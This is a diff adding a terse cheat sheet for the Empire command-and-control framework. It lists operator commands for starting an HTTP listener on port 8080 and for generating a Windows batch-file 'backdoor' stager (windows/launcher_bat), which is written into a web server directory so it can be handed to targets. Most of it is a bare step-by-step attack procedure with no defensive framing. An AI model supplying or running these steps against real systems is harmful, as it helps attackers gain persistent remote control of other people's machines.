@@ -1,0 +1,48 @@
+#!Empire
+...............................................................................
+Basic command to create simple listener
+create listener
+> listeners
+:listeners > uselistener
+
+> http uselistener
+>info
+//display all information
+
+:listener/http > set Port 8080
+	>info
+	//display all information
+	
+	>set Host http://IP:8080 
+	
+	>help
+	//display all listener command
+	
+	>execute
+	//Listener sucessfully started
+	> back
+
+:listener> list
+[*] Active listener:
+....
+...
+..
+>back
+//now you will be on main menu
+//Here you can see you have 1 active listener
+Empire> 
+..........................................................
+#create http backdoor
+Empire > help
+//you will see "usetager"
+Empire > usestager
+//you will see framework
+Empire > usestager <framework> //suppose windows/launcher_bat
+Empire: windows/launcher_bat> info
+			    > set Listener <name>
+			    > set outfile /var/www/html/<directory>/<file name>.bat
+			    >execute
+
+
+
+...........................................................
